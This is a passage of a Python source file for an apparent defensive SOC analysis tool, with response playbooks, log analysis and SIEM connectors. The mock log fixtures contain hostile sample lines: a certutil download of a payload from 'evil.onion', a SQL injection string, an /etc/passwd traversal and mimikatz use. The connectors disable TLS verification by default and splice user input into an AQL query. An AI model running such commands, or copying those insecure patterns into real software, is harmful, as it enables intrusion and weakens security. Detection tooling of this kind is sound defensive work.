            'description': 'Response for detected network scanning, enumeration, or reconnaissance activity.',
            'steps': [
                {'step': 1, 'action': 'Source Identification', 'details': 'Identify scanning source IP, geolocation, and reputation.', 'responsible': 'SOC Analyst', 'time_est': 10},
                {'step': 2, 'action': 'Block Source', 'details': 'Block the source IP at perimeter firewall and WAF.', 'responsible': 'SOC Analyst', 'time_est': 5},
                {'step': 3, 'action': 'Assess Exposure', 'details': 'Review what services/ports were discovered by the attacker.', 'responsible': 'SOC Analyst', 'time_est': 20},
                {'step': 4, 'action': 'Check for Follow-Up', 'details': 'Look for exploitation attempts following the reconnaissance phase.', 'responsible': 'SOC Analyst', 'time_est': 30},
                {'step': 5, 'action': 'Harden Services', 'details': 'Close unnecessary ports, update firewall rules, and minimize attack surface.', 'responsible': 'Security Engineering', 'time_est': 60},
            ],
            'estimated_time': 125,
        },
    }

    # Default fallback playbook for categories without a specific template
    DEFAULT_TEMPLATE = {
        'title': 'Generic Incident Response Playbook',
        'description': 'Standard incident response procedure for security events.',
        'steps': [
            {'step': 1, 'action': 'Detection & Triage', 'details': 'Validate the alert, assess severity, and determine scope.', 'responsible': 'SOC Analyst', 'time_est': 15},
            {'step': 2, 'action': 'Containment', 'details': 'Contain the threat to prevent further damage or spread.', 'responsible': 'SOC Analyst', 'time_est': 15},
            {'step': 3, 'action': 'Investigation', 'details': 'Conduct root cause analysis and forensic investigation.', 'responsible': 'DFIR Team', 'time_est': 60},
            {'step': 4, 'action': 'Eradication', 'details': 'Remove threat artifacts and close attack vectors.', 'responsible': 'Security Engineering', 'time_est': 60},
            {'step': 5, 'action': 'Recovery', 'details': 'Restore affected systems and verify integrity.', 'responsible': 'IT Operations', 'time_est': 60},
            {'step': 6, 'action': 'Lessons Learned', 'details': 'Document findings and update detection/response procedures.', 'responsible': 'SOC Lead', 'time_est': 30},
        ],
        'estimated_time': 240,
    }

    def __init__(self):
        self.logger = logging.getLogger(__name__ + '.PlaybookGenerator')

    def generate(self, alerts: List[SOCAlert]) -> List[Playbook]:
        """Generate playbooks for detected alerts."""
        playbooks: List[Playbook] = []
        categories_covered: Set[str] = set()

        for alert in alerts:
            if alert.category in categories_covered:
                continue
            categories_covered.add(alert.category)

            template = self.PLAYBOOK_TEMPLATES.get(
                alert.category, self.DEFAULT_TEMPLATE
            )

            mitre_tactics = list(set(
                m.tactic for m in alert.mitre_mappings
            ))

            playbooks.append(Playbook(
                playbook_id=str(uuid.uuid4())[:12],
                title=template['title'],
                description=template['description'],
                incident_type=alert.category,
                severity=alert.severity,
                steps=template['steps'],
                mitre_tactics=mitre_tactics,
                estimated_time_minutes=template['estimated_time'],
                tags=[alert.category.lower().replace(' ', '_'), alert.severity.value],
            ))

        return playbooks


# ---------------------------------------------------------------------------
# Main SOC Analysis Engine
# ---------------------------------------------------------------------------

class AdvancedSOCAnalyzer:
    """
    Advanced SOC Analysis Engine — the main orchestrator.

    Combines log parsing, IOC extraction, MITRE ATT&CK mapping,
    alert correlation, anomaly detection, timeline reconstruction,
    and playbook generation into a single analysis pipeline.
    """

    def __init__(self):
        self.logger = logging.getLogger(__name__ + '.SOCAnalyzer')
        self.log_parser = LogParser()
        self.ioc_extractor = IOCExtractor()
        self.mitre_mapper = MitreAttackMapper()
        self.correlation_engine = AlertCorrelationEngine()
        self.anomaly_detector = AnomalyDetector()
        self.timeline_reconstructor = TimelineReconstructor()
        self.playbook_generator = PlaybookGenerator()

    def analyze(self, raw_logs: str,
                log_format: LogFormat = LogFormat.AUTO,
                include_playbooks: bool = True) -> SOCAnalysisReport:
        """
        Run a full SOC analysis pipeline on raw log data.

        Args:
            raw_logs: Raw log text (multi-line string)
            log_format: Expected log format (AUTO for auto-detection)
            include_playbooks: Whether to generate response playbooks

        Returns:
            SOCAnalysisReport with all findings
        """
        self.logger.info("Starting SOC analysis pipeline...")
        analysis_start = _utc_now()

        # Step 1: Parse & normalize logs
        log_entries = self.log_parser.parse_bulk(raw_logs, log_format)
        self.logger.info("Parsed %d log entries", len(log_entries))

        # Step 2: Extract IOCs
        iocs = self.ioc_extractor.extract_from_logs(log_entries)
        # Also extract from raw text for anything the per-entry pass might miss
        raw_iocs = self.ioc_extractor.extract_all(raw_logs)
        seen_ioc_keys = {(i.ioc_type, i.value.lower()) for i in iocs}
        for ioc in raw_iocs:
            key = (ioc.ioc_type, ioc.value.lower())
            if key not in seen_ioc_keys:
                iocs.append(ioc)
                seen_ioc_keys.add(key)

        self.logger.info("Extracted %d IOCs", len(iocs))

        # Step 3: MITRE ATT&CK mapping on IOCs
        ioc_mitre = self.mitre_mapper.map_iocs(iocs)

        # Step 4: Alert correlation
        alerts = self.correlation_engine.correlate(log_entries, iocs)
        self.logger.info("Generated %d correlated alerts", len(alerts))

        # Step 5: Anomaly detection
        anomalies = self.anomaly_detector.detect_anomalies(log_entries)
        self.logger.info("Detected %d anomalies", len(anomalies))

        # Step 6: Timeline reconstruction
        timeline = self.timeline_reconstructor.reconstruct(alerts, log_entries)

        # Step 7: Playbook generation
        playbooks = []
        if include_playbooks and alerts:
            playbooks = self.playbook_generator.generate(alerts)

        # Step 8: Compile report
        severity_counts = Counter(a.severity for a in alerts)
        risk_score = self._calculate_overall_risk(alerts, anomalies, iocs)
        executive_summary = self._generate_executive_summary(
            log_entries, alerts, iocs, anomalies, risk_score
        )
        recommendations = self._generate_recommendations(alerts, anomalies)

        report = SOCAnalysisReport(
            report_id=str(uuid.uuid4())[:12],
            analysis_timestamp=analysis_start,
            total_logs_processed=len(log_entries),
            total_alerts=len(alerts),
            critical_alerts=severity_counts.get(ThreatSeverity.CRITICAL, 0),
            high_alerts=severity_counts.get(ThreatSeverity.HIGH, 0),
            medium_alerts=severity_counts.get(ThreatSeverity.MEDIUM, 0),
            low_alerts=severity_counts.get(ThreatSeverity.LOW, 0),
            iocs_extracted=len(iocs),
            anomalies_detected=len(anomalies),
            mitre_techniques_identified=len(set(
                m.technique_id
                for a in alerts
                for m in a.mitre_mappings
            )) + len(set(m.technique_id for m in ioc_mitre)),
            alerts=alerts,
            iocs=iocs,
            anomalies=anomalies,
            timeline=timeline,
            playbooks=playbooks,
            risk_score=risk_score,
            executive_summary=executive_summary,
            recommendations=recommendations,
        )

        self.logger.info("SOC analysis complete. Risk score: %.1f/10", risk_score)
        return report

    def analyze_single_event(self, event_text: str) -> Dict[str, Any]:
        """Quick analysis of a single event/log line."""
        entry = self.log_parser.parse_line(event_text)
        iocs = self.ioc_extractor.extract_all(event_text)
        mitre = self.mitre_mapper.map_event(event_text)

        return {
            'parsed_event': entry,
            'iocs': iocs,
            'mitre_mappings': mitre,
            'threat_level': self._assess_single_event_threat(iocs, mitre),
        }

    def get_mitre_attack_coverage(self, report: SOCAnalysisReport) -> Dict[str, Any]:
        """Get MITRE ATT&CK coverage summary from a report."""
        techniques: Dict[str, Dict] = {}
        for alert in report.alerts:
            for m in alert.mitre_mappings:
                if m.technique_id not in techniques:
                    techniques[m.technique_id] = {
                        'technique': m.technique,
                        'tactic': m.tactic,
                        'confidence': m.confidence,
                        'alert_count': 0,
                    }
                techniques[m.technique_id]['alert_count'] += 1

        tactics_covered = set(t['tactic'] for t in techniques.values())
        kill_chain = self.timeline_reconstructor.get_kill_chain_coverage(report.timeline)

        return {
            'techniques': techniques,
            'total_techniques': len(techniques),
            'tactics_covered': list(tactics_covered),
            'total_tactics': len(tactics_covered),
            'kill_chain_coverage': kill_chain,
        }

    def _calculate_overall_risk(self, alerts: List[SOCAlert],
                                anomalies: List[AnomalyResult],
                                iocs: List[IOCResult]) -> float:
        """Calculate overall risk score 0-10."""
        if not alerts and not anomalies:
            return 0.0

        # Base from alert severities
        severity_weights = {
            ThreatSeverity.CRITICAL: 2.5,
            ThreatSeverity.HIGH: 1.5,
            ThreatSeverity.MEDIUM: 0.8,
            ThreatSeverity.LOW: 0.3,
            ThreatSeverity.INFORMATIONAL: 0.1,
        }

        alert_score = sum(
            severity_weights.get(a.severity, 0.5) for a in alerts
        )

        # Anomaly contribution
        anomaly_score = len(anomalies) * 0.5

        # High-threat IOC contribution
        high_threat_iocs = sum(1 for i in iocs if i.threat_score >= 7.0)
        ioc_score = high_threat_iocs * 0.3

        total = alert_score + anomaly_score + ioc_score
        return min(total, 10.0)

    def _assess_single_event_threat(self, iocs: List[IOCResult],
                                    mitre: List[MitreMapping]) -> str:
        """Assess threat level for a single event."""
        if any(m.confidence >= 0.7 for m in mitre):
            return 'high'
        if any(i.threat_score >= 7.0 for i in iocs):
            return 'high'
        if mitre or any(i.threat_score >= 5.0 for i in iocs):
            return 'medium'
        if iocs:
            return 'low'
        return 'informational'

    def _generate_executive_summary(self, log_entries: List[NormalizedLogEntry],
                                    alerts: List[SOCAlert],
                                    iocs: List[IOCResult],
                                    anomalies: List[AnomalyResult],
                                    risk_score: float) -> str:
        """Generate an executive summary of the analysis."""
        critical_count = sum(1 for a in alerts if a.severity == ThreatSeverity.CRITICAL)
        high_count = sum(1 for a in alerts if a.severity == ThreatSeverity.HIGH)
        high_threat_iocs = sum(1 for i in iocs if i.threat_score >= 7.0)

        if risk_score >= 8.0:
            risk_label = "CRITICAL"
            urgency = "Immediate executive attention and incident response engagement required."
        elif risk_score >= 6.0:
            risk_label = "HIGH"
            urgency = "Urgent investigation and containment actions recommended."
        elif risk_score >= 4.0:
            risk_label = "MEDIUM"
            urgency = "Active monitoring and follow-up investigation recommended."
        elif risk_score >= 2.0:
            risk_label = "LOW"
            urgency = "Standard monitoring procedures are sufficient."
        else:
            risk_label = "MINIMAL"
            urgency = "No immediate action required."

        categories = list(set(a.category for a in alerts))

        summary = (
            f"SOC Analysis Report — Risk Level: {risk_label} ({risk_score:.1f}/10)\n\n"
            f"Analyzed {len(log_entries)} log entries and identified {len(alerts)} "
            f"correlated security alerts ({critical_count} critical, {high_count} high). "
            f"Extracted {len(iocs)} indicators of compromise ({high_threat_iocs} high-threat). "
            f"Detected {len(anomalies)} statistical anomalies.\n\n"
        )

        if categories:
            summary += f"Alert categories: {', '.join(categories)}.\n\n"

        summary += urgency

        return summary

    def _generate_recommendations(self, alerts: List[SOCAlert],
                                  anomalies: List[AnomalyResult]) -> List[str]:
        """Generate prioritized recommendations."""
        recommendations: List[str] = []
        seen: Set[str] = set()

        # From alerts (priority order — highest severity first)
        for alert in sorted(alerts, key=lambda a: a.score, reverse=True):
            for action in alert.recommended_actions[:3]:
                if action not in seen:
                    seen.add(action)
                    recommendations.append(
                        f"[{alert.severity.value.upper()}] {action}"
                    )

        # From anomalies
        for anomaly in anomalies:
            rec = f"[ANOMALY] Investigate {anomaly.metric_name}: {anomaly.description}"
            if rec not in seen:
                seen.add(rec)
                recommendations.append(rec)

        return recommendations[:20]  # top 20

    def to_dict(self, report: SOCAnalysisReport) -> Dict[str, Any]:
        """Serialize a SOCAnalysisReport to a JSON-compatible dictionary."""
        return {
            'report_id': report.report_id,
            'analysis_timestamp': report.analysis_timestamp.isoformat(),
            'total_logs_processed': report.total_logs_processed,
            'total_alerts': report.total_alerts,
            'critical_alerts': report.critical_alerts,
            'high_alerts': report.high_alerts,
            'medium_alerts': report.medium_alerts,
            'low_alerts': report.low_alerts,
            'iocs_extracted': report.iocs_extracted,
            'anomalies_detected': report.anomalies_detected,
            'mitre_techniques_identified': report.mitre_techniques_identified,
            'risk_score': report.risk_score,
            'executive_summary': report.executive_summary,
            'recommendations': report.recommendations,
            'alerts': [
                {
                    'alert_id': a.alert_id,
                    'title': a.title,
                    'description': a.description,
                    'severity': a.severity.value,
                    'category': a.category,
                    'score': a.score,
                    'false_positive_probability': a.false_positive_probability,
                    'timestamp': a.timestamp.isoformat() if a.timestamp else None,
                    'ioc_count': len(a.iocs),
                    'mitre_techniques': [
                        {'id': m.technique_id, 'name': m.technique,
                         'tactic': m.tactic, 'confidence': m.confidence}
                        for m in a.mitre_mappings
                    ],
                    'recommended_actions': a.recommended_actions,
                    'event_count': len(a.source_events),
                }
                for a in report.alerts
            ],
            'iocs': [
                {
                    'type': i.ioc_type,
                    'value': i.value,
                    'confidence': i.confidence,
                    'threat_score': i.threat_score,
                    'tags': i.tags,
                }
                for i in report.iocs
            ],
            'anomalies': [
                {
                    'metric': a.metric_name,
                    'value': a.current_value,
                    'baseline_mean': a.baseline_mean,
                    'z_score': a.z_score,
                    'severity': a.severity.value,
                    'description': a.description,
                }
                for a in report.anomalies
            ],
            'timeline': [
                {
                    'timestamp': t.timestamp.isoformat() if t.timestamp else None,
                    'event_type': t.event_type,
                    'description': t.description,
                    'severity': t.severity.value,
                    'mitre_tactic': t.mitre_tactic,
                    'mitre_technique': t.mitre_technique,
                    'artifacts': t.artifacts,
                }
                for t in report.timeline
            ],
            'playbooks': [
                {
                    'playbook_id': p.playbook_id,
                    'title': p.title,
                    'description': p.description,
                    'incident_type': p.incident_type,
                    'severity': p.severity.value,
                    'steps': p.steps,
                    'estimated_time_minutes': p.estimated_time_minutes,
                    'mitre_tactics': p.mitre_tactics,
                    'tags': p.tags,
                }
                for p in report.playbooks
            ],
        }


# ---------------------------------------------------------------------------
# SIEM Connectors (Splunk, QRadar, Elasticsearch, Webhook)
# ---------------------------------------------------------------------------

class SIEMConnectorType(Enum):
    """Supported SIEM Integration types."""
    SPLUNK = "splunk"
    QRADAR = "qradar"
    ELASTICSEARCH = "elasticsearch"
    GENERIC_WEBHOOK = "generic_webhook"


class SIEMConnector:
    """Base class for external SIEM and log source connectors."""

    def __init__(self, name: str, url: str, token: str, verify_ssl: bool = False, is_mock: bool = False):
        self.name = name
        self.url = url.rstrip('/')
        self.token = token
        self.verify_ssl = verify_ssl
        self.is_mock = is_mock
        self.logger = logging.getLogger(f"{__name__}.siem.{name}")

    def test_connection(self) -> Tuple[bool, str]:
        """Test authentication and endpoint connectivity."""
        raise NotImplementedError

    def fetch_logs(self, query: str, limit: int = 100) -> Tuple[bool, List[str], str]:
        """Fetch raw log lines using the SIEM search query interface."""
        raise NotImplementedError

    def forward_alert(self, alert: SOCAlert) -> Tuple[bool, str]:
        """Send a correlated SecScan AI SOC alert to the SIEM index/receiver."""
        raise NotImplementedError


class SplunkConnector(SIEMConnector):
    """Splunk REST API (Search) and HTTP Event Collector (HEC) Connector."""

    def test_connection(self) -> Tuple[bool, str]:
        if self.is_mock or "mock" in self.token.lower() or not self.url:
            return True, "Mock connection to Splunk successful (REST API & HEC Active)."

        # Standard Splunk REST API call to verify auth
        # Splunk management port is typically 8089
        import requests
        try:
            headers = {"Authorization": f"Splunk {self.token}"}
            response = requests.get(
                f"{self.url}/services/authentication/users?output_mode=json",
                headers=headers,
                verify=self.verify_ssl,
                timeout=5
            )
            if response.status_code == 200:
                return True, "Connected successfully to Splunk REST API."
            return False, f"Splunk API authentication failed: Status {response.status_code}"
        except Exception as e:
            return False, f"Failed to reach Splunk server: {str(e)}"

    def fetch_logs(self, query: str, limit: int = 100) -> Tuple[bool, List[str], str]:
        """Fetch logs from Splunk via search job endpoint."""
        if self.is_mock or "mock" in self.token.lower():
            # Return realistic simulated logs
            simulated_logs = [
                f"Jul 05 00:05:12 splunk-ingest sshd[9988]: Failed password for root from 198.51.100.42 port 51101 ssh2",
                f"Jul 05 00:05:15 splunk-ingest sshd[9988]: Failed password for admin from 198.51.100.42 port 51102 ssh2",
                f"Jul 05 00:05:22 splunk-ingest apache2: 198.51.100.42 - - \"GET /search?q=1' UNION SELECT 1--\" 200 404",
                f"Jul 05 00:05:35 splunk-ingest local-agent: Executed command certutil.exe -urlcache -f http://evil.onion/payload.exe",
            ]
            return True, simulated_logs[:limit], "Simulated logs retrieved from Mock Splunk query."

        import requests
        try:
            headers = {"Authorization": f"Splunk {self.token}"}
            # Step 1: Create search job
            search_query = query if query.startswith('search') else f"search {query}"
            data = {
                "search": search_query,
                "count": limit,
                "output_mode": "json"
            }
            response = requests.post(
                f"{self.url}/services/search/jobs",
                headers=headers,
                data=data,
                verify=self.verify_ssl,
                timeout=10
            )
            if response.status_code not in (200, 201):
                return False, [], f"Splunk search job creation failed: Status {response.status_code}"

            sid = response.json().get("sid")
            if not sid:
                return False, [], "No search ID returned by Splunk."

            # Step 2: Retrieve search results (polling simplified for compliance)
            results_response = requests.get(
                f"{self.url}/services/search/jobs/{sid}/results?output_mode=json&count={limit}",
                headers=headers,
                verify=self.verify_ssl,
                timeout=10
            )
            if results_response.status_code == 200:
                results_data = results_response.json()
                # Extract the raw logs
                logs = []
                for result in results_data.get("results", []):
                    # Splunk raw text is stored in '_raw'
                    raw_log = result.get("_raw", json.dumps(result))
                    logs.append(raw_log)
                return True, logs, f"Retrieved {len(logs)} log lines from Splunk search."
            return False, [], f"Splunk results retrieval failed: Status {results_response.status_code}"

        except Exception as e:
            return False, [], f"Error executing Splunk search: {str(e)}"

    def forward_alert(self, alert: SOCAlert) -> Tuple[bool, str]:
        """Send alert to Splunk HTTP Event Collector (HEC)."""
        if self.is_mock or "mock" in self.token.lower():
            return True, f"Alert '{alert.title}' successfully forwarded to Mock Splunk HEC index."

        # HEC standard port is typically 8088
        import requests
        try:
            headers = {
                "Authorization": f"Splunk {self.token}",
                "Content-Type": "application/json"
            }
            payload = {
                "event": {
                    "alert_id": alert.alert_id,
                    "title": alert.title,
                    "severity": alert.severity.value,
                    "category": alert.category,
                    "score": alert.score,
                    "mitre_techniques": [m.technique_id for m in alert.mitre_mappings],
                    "timestamp": alert.timestamp.isoformat() if alert.timestamp else None,
                    "description": alert.description,
                    "recommended_actions": alert.recommended_actions
                },
                "sourcetype": "secscan_ai:soc:alert"
            }
            response = requests.post(
                f"{self.url}/services/collector/event",
                headers=headers,
                json=payload,
                verify=self.verify_ssl,
                timeout=5
            )
            if response.status_code in (200, 201, 202):
                return True, "Alert forwarded to Splunk HEC."
            return False, f"Splunk HEC rejected event: Status {response.status_code}"
        except Exception as e:
            return False, f"Splunk forwarding failed: {str(e)}"


class QRadarConnector(SIEMConnector):
    """IBM Security QRadar Ariel Query Language (AQL) REST API Connector."""

    def test_connection(self) -> Tuple[bool, str]:
        if self.is_mock or "mock" in self.token.lower() or not self.url:
            return True, "Mock connection to QRadar successful (Ariel API Ready)."

        import requests
        try:
            # QRadar uses SEC token in SEC header
            headers = {
                "SEC": self.token,
                "Accept": "application/json"
            }
            response = requests.get(
                f"{self.url}/api/ariel/databases",
                headers=headers,
                verify=self.verify_ssl,
                timeout=5
            )
            if response.status_code == 200:
                return True, "Connected successfully to IBM QRadar Ariel Database API."
            return False, f"QRadar authentication failed: Status {response.status_code}"
        except Exception as e:
            return False, f"Failed to reach QRadar server: {str(e)}"

    def fetch_logs(self, query: str, limit: int = 100) -> Tuple[bool, List[str], str]:
        """Fetch event logs from QRadar using AQL."""
        if self.is_mock or "mock" in self.token.lower():
            # Simulated QRadar logs
            simulated_logs = [
                f"Jul 05 00:06:01 qradar-events auditd: Unauthorized credential dumping mimikatz run by user db_admin",
                f"Jul 05 00:06:12 qradar-events firewall: ACCEPT connection on high port 4444 from 198.51.100.42",
                f"Jul 05 00:06:22 qradar-events web-api: path traversal attempt GET /../../../../etc/passwd from 198.51.100.42",
            ]
            return True, simulated_logs[:limit], "Simulated logs retrieved from Mock QRadar query."

        import requests
        try:
            headers = {
                "SEC": self.token,
                "Accept": "application/json"
            }
            # AQL Search execution
            # Ariel searches require URL encoding of the query
            aql_query = query if "select" in query.lower() else f"SELECT UTF8(payload) FROM events WHERE payload CONTAINS '{query}' LIMIT {limit}"
            params = {"query_expression": aql_query}

            response = requests.post(
                f"{self.url}/api/ariel/searches",
                headers=headers,
                params=params,
                verify=self.verify_ssl,
                timeout=10
            )
            if response.status_code not in (200, 201):
                return False, [], f"QRadar search failed to trigger: Status {response.status_code}"

            search_id = response.json().get("search_id")
            if not search_id:
                return False, [], "No search_id returned by QRadar."

            # Retrieve results
            results_response = requests.get(
                f"{self.url}/api/ariel/searches/{search_id}/results",
                headers=headers,
                verify=self.verify_ssl,
                timeout=10
            )
            if results_response.status_code == 200:
                events = results_response.json().get("events", [])
                logs = []
                for event in events:
                    # QRadar payloads are returned as dictionaries, look for payload/message fields
                    raw = event.get("UTF8(payload)", event.get("payload", json.dumps(event)))
                    logs.append(raw)
                return True, logs, f"Retrieved {len(logs)} log lines from QRadar search."
            return False, [], f"QRadar results retrieval failed: Status {results_response.status_code}"
        except Exception as e:
            return False, [], f"Error executing QRadar Ariel query: {str(e)}"

    def forward_alert(self, alert: SOCAlert) -> Tuple[bool, str]:
        """Forward alert to QRadar via Syslog or HTTP Webhook API."""
        if self.is_mock or "mock" in self.token.lower():
            return True, f"Alert '{alert.title}' successfully forwarded to Mock QRadar Event Collector."

        # Forwarding via QRadar REST API event payload receiver or Syslog
        import requests
        try:
            # In QRadar we can push custom events to a target endpoint
            headers = {
                "SEC": self.token,
                "Content-Type": "application/json"
            }
            payload = {
                "alert_id": alert.alert_id,
                "title": f"SecScan AI-SOC: {alert.title}",
                "severity": alert.severity.value,
                "category": alert.category,
                "score": alert.score,
                "description": alert.description,
                "mitre_techniques": [m.technique_id for m in alert.mitre_mappings],
                "recommended_actions": alert.recommended_actions,
                "generator": "SecScan AI"
            }
            # Custom HTTP receiver endpoint for QRadar
            response = requests.post(
                f"{self.url}/api/custom_events",
                headers=headers,
                json=payload,
                verify=self.verify_ssl,
                timeout=5
            )
            if response.status_code in (200, 201, 202):
                return True, "Alert sent to QRadar API."
            return False, f"QRadar rejected custom event: Status {response.status_code}"
        except Exception as e:
            return False, f"QRadar forwarding failed: {str(e)}"


class ElasticsearchConnector(SIEMConnector):
    """Elasticsearch Query REST API and Index Ingestion Connector."""

    def test_connection(self) -> Tuple[bool, str]:
        if self.is_mock or "mock" in self.token.lower() or not self.url:
            return True, "Mock connection to Elasticsearch successful."

        import requests
        try:
            headers = {"Authorization": f"ApiKey {self.token}"} if self.token else {}
            response = requests.get(
                self.url,
                headers=headers,
                verify=self.verify_ssl,
                timeout=5
            )
            if response.status_code == 200:
                tagline = response.json().get("tagline", "")
                return True, f"Connected to Elasticsearch. Tagline: {tagline}"
            return False, f"Elasticsearch connection failed: Status {response.status_code}"
        except Exception as e:
            return False, f"Failed to reach Elasticsearch server: {str(e)}"

    def fetch_logs(self, query: str, limit: int = 100) -> Tuple[bool, List[str], str]:
        """Query Elasticsearch index for log records."""
        if self.is_mock or "mock" in self.token.lower():
            simulated_logs = [
                f"Jul 05 00:07:01 elasticsearch-ingest login-agent: User admin attempted bypass to root shell",
                f"Jul 05 00:07:15 elasticsearch-ingest proxy-gateway: connection blocked to mega.nz exfiltration site from 10.0.0.5",
                f"Jul 05 00:07:35 elasticsearch-ingest db-core: sql syntax anomaly flagged on query",
            ]
            return True, simulated_logs[:limit], "Simulated logs retrieved from Mock Elasticsearch."

        import requests
        try:
            headers = {
                "Authorization": f"ApiKey {self.token}" if self.token else None,
                "Content-Type": "application/json"
            }
            # DSL query search
            dsl = {
                "query": {
                    "query_string": {
                        "query": query
                    }
                },
                "size": limit
            }
            response = requests.post(
                f"{self.url}/_search",
                headers={k: v for k, v in headers.items() if v is not None},
                json=dsl,
                verify=self.verify_ssl,
                timeout=10
            )
            if response.status_code == 200:
                hits = response.json().get("hits", {}).get("hits", [])
                logs = []
                for hit in hits:
                    source = hit.get("_source", {})
                    # Standard message or raw log field
                    raw_log = source.get("message", source.get("log", json.dumps(source)))
                    logs.append(raw_log)
                return True, logs, f"Retrieved {len(logs)} hits from Elasticsearch."
            return False, [], f"Elasticsearch query failed: Status {response.status_code}"
        except Exception as e:
            return False, [], f"Elasticsearch error: {str(e)}"

    def forward_alert(self, alert: SOCAlert) -> Tuple[bool, str]:
        """Post a SOC alert into Elasticsearch index."""
        if self.is_mock or "mock" in self.token.lower():
            return True, f"Alert '{alert.title}' successfully forwarded to Mock Elasticsearch."

        import requests
        try:
            headers = {
                "Authorization": f"ApiKey {self.token}" if self.token else None,
                "Content-Type": "application/json"
            }
            payload = {
                "alert_id": alert.alert_id,
                "title": alert.title,
                "severity": alert.severity.value,
                "category": alert.category,
                "score": alert.score,
                "description": alert.description,
                "mitre_techniques": [m.technique_id for m in alert.mitre_mappings],
                "recommended_actions": alert.recommended_actions,
                "@timestamp": alert.timestamp.isoformat() if alert.timestamp else None
            }
            response = requests.post(
                f"{self.url}/secscan_ai-soc-alerts/_doc",
                headers={k: v for k, v in headers.items() if v is not None},
                json=payload,
                verify=self.verify_ssl,
                timeout=5
            )
            if response.status_code in (200, 201):
                return True, "Alert posted to Elasticsearch index 'secscan_ai-soc-alerts'."
            return False, f"Elasticsearch rejected alert: Status {response.status_code}"
        except Exception as e:
            return False, f"Elasticsearch forward failed: {str(e)}"


class WebhookConnector(SIEMConnector):
    """Generic Webhook Forwarder for Slack, Teams, SOAR, or other webhook receivers."""

    def test_connection(self) -> Tuple[bool, str]:
        if self.is_mock or not self.url:
            return True, "Mock connection to Webhook Receiver successful."

        import requests
        try:
            # Quick ping/OPTIONS test or dummy check
            response = requests.options(self.url, timeout=5)
            return True, f"Webhook server returned status: {response.status_code}"
        except Exception as e:
            return False, f"Webhook connection test failed: {str(e)}"

    def fetch_logs(self, query: str, limit: int = 100) -> Tuple[bool, List[str], str]:
        """Webhooks are push-only and do not support pulling logs."""
        return False, [], "Fetch logs not supported on Webhook connector."

    def forward_alert(self, alert: SOCAlert) -> Tuple[bool, str]:
        if self.is_mock:
            return True, f"Webhook payload for '{alert.title}' successfully simulated."

        import requests
        try:
            # Format custom payload based on webhook endpoint target (detect Slack/Teams)
            payload = {
                "text": f"🚨 *SecScan AI SOC Alert: {alert.title}* ({alert.severity.value.upper()})\n"
                        f"Score: {alert.score:.1f}/100 | Category: {alert.category}\n"
                        f"Description: {alert.description}\n"
                        f"Recommended Actions:\n" + "\n".join(f"- {a}" for a in alert.recommended_actions[:3])
            }
            
            # If target URL is not Slack/Teams, send full JSON alert
            if "slack.com" not in self.url.lower() and "office.com" not in self.url.lower():
                payload = {
                    "event": "alert",
                    "id": alert.alert_id,
                    "title": alert.title,
                    "severity": alert.severity.value,
                    "category": alert.category,
                    "score": alert.score,
                    "description": alert.description,
                    "timestamp": alert.timestamp.isoformat() if alert.timestamp else None,
                    "recommended_actions": alert.recommended_actions
                }

            response = requests.post(
                self.url,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            if response.status_code in (200, 201, 204):
                return True, "Alert posted successfully via Webhook."
            return False, f"Webhook receiver rejected event: Status {response.status_code}"
        except Exception as e:
            return False, f"Webhook delivery failed: {str(e)}"


class SIEMConnectorManager:
    """Manages active SIEM connections, query pipelines, and alert forwarding routing."""

    def __init__(self):
        self.connectors: Dict[str, SIEMConnector] = {}

    def register_connector(self, connector_id: str, connector: SIEMConnector):
        """Register a SIEM connector instance."""
        self.connectors[connector_id] = connector

    def get_connector(self, connector_id: str) -> Optional[SIEMConnector]:
        return self.connectors.get(connector_id)

    def test_all(self) -> Dict[str, Tuple[bool, str]]:
        """Test connections to all registered SIEMs."""
        results = {}
        for cid, conn in self.connectors.items():
            results[cid] = conn.test_connection()
        return results

    def forward_alert_to_all(self, alert: SOCAlert) -> Dict[str, Tuple[bool, str]]:
        """Forward a correlated alert to all registered SIEM receivers."""
        results = {}
        for cid, conn in self.connectors.items():
            try:
                results[cid] = conn.forward_alert(alert)
            except Exception as e:
                results[cid] = (False, f"Error: {str(e)}")
        return results


# ---------------------------------------------------------------------------
# Convenience factory function
# ---------------------------------------------------------------------------

def get_soc_analyzer() -> AdvancedSOCAnalyzer:
    """Factory function to get an AdvancedSOCAnalyzer instance."""
    return AdvancedSOCAnalyzer()
